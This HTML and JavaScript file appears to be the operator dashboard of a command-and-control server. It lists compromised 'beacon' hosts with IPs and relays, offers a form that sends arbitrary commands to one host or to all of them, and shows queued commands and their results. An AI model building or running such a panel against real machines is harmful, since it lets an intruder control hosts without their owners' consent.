<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 MISSION CONTROL</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        /* High-Contrast Readability */
        .card { background: var(--card); border: 1px solid #333; border-radius: 4px; height: 100%; }
        .table { color: var(--text); }
        .table-striped tbody tr:nth-of-type(odd) { background-color: rgba(255,255,255,0.02); }
        
        .terminal-box { 
            background: #000; border: 1px solid #444; color: #fff; 
            font-family: 'Consolas', monospace; font-size: 0.85rem;
            height: 300px; overflow-y: auto; padding: 10px;
        }
        
        .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
        .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
    </style>
</head>
<body class="p-4">
    <div class="container-fluid">
        <div class="row mb-3">
            <div class="col-md-8">
                <h2 class="text-neon">C2_STRATEGIC_COMMAND <small class="text-muted" style="font-size: 0.9rem;">// ASSET MONITORING</small></h2>
            </div>
            <div class="col-md-4 text-end">
                <div class="p-2 border border-success">
                    ACTIVE_BEACONS: <span id="agent-count" class="fw-bold">0</span>
                </div>
            </div>
        </div>

        <div class="row g-3">
            <div class="col-lg-8">
                <div class="card p-3">
                    <h6>LIVE_ASSET_INVENTORY</h6>
                    <table class="table table-hover">
                        <thead>
                            <tr class="text-muted">
                                <th>HOSTNAME</th>
                                <th>IP_ADDRESS</th>
                                <th>RELAY_POINT</th>
                                <th>LAST_SEEN</th>
                                <th>STATUS</th>
                            </tr>
                        </thead>
                        <tbody id="agent-table">
                            </tbody>
                    </table>
                </div>
            </div>

            <div class="col-lg-4">
                <div class="card p-3">
                    <h6>OUTBOUND_QUEUE</h6>
                    <div id="queue-list" class="terminal-box" style="height: 100%;">
                        </div>
                </div>
            </div>

            <div class="col-lg-6">
                <div class="card p-3">
                    <h6>INSTRUCTION_UPLINK</h6>
                    <form action="/admin/send_cmd" method="POST" id="cmd-form">
                        <div class="input-group">
                            <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 150px;">
                                <option value="ALL">BROADCAST</option>
                            </select>
                            <input type="text" name="command" class="form-control bg-dark text-white" placeholder="ENTER COMMAND..." required>
                            <button class="btn btn-outline-success">EXECUTE</button>
                        </div>
                    </form>
                </div>
            </div>

            <div class="col-lg-6">
                <div class="card p-3">
                    <h6>EXECUTION_OUTPUT_FEED</h6>
                    <div id="results-feed" class="terminal-box">
                        </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function updateDashboard() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();

                // 1. Update Count
                document.getElementById('agent-count').innerText = data.total_count;

                // 2. Update Table
                const table = document.getElementById('agent-table');
                table.innerHTML = '';
                const select = document.getElementById('target-select');
                
                // Clear and re-fill select except for 'ALL'
                select.innerHTML = '<option value="ALL">BROADCAST</option>';

                for (const [host, info] of Object.entries(data.agents)) {
                    table.innerHTML += `<tr>
                        <td><b>${host}</b></td>
                        <td>${info.ip}</td>
                        <td><span class="text-info">${info.relay}</span></td>
                        <td>${info.last_seen}</td>
                        <td><span class="text-success">● ONLINE</span></td>
                    </tr>`;
                    
                    select.innerHTML += `<option value="${host}">${host}</option>`;
                    
                    // Update Results Feed if available
                    if(info.last_result) {
                        const resFeed = document.getElementById('results-feed');
                        if (!resFeed.innerHTML.includes(info.last_result)) {
                            resFeed.innerHTML = `<div><span class="text-warning">[${host}]</span> ${info.last_result}</div>` + resFeed.innerHTML;
                        }
                    }
                }

                // 3. Update Queue
                const qList = document.getElementById('queue-list');
                qList.innerHTML = '';
                for (const [host, cmd] of Object.entries(data.queue)) {
                    qList.innerHTML += `<div><span class="badge-pending">PENDING</span> ${host} -> ${cmd}</div>`;
                }
            } catch (e) { console.error("Update failed", e); }
        }

        setInterval(updateDashboard, 3000); // Poll every 3 seconds
        updateDashboard();
    </script>
</body>
</html>
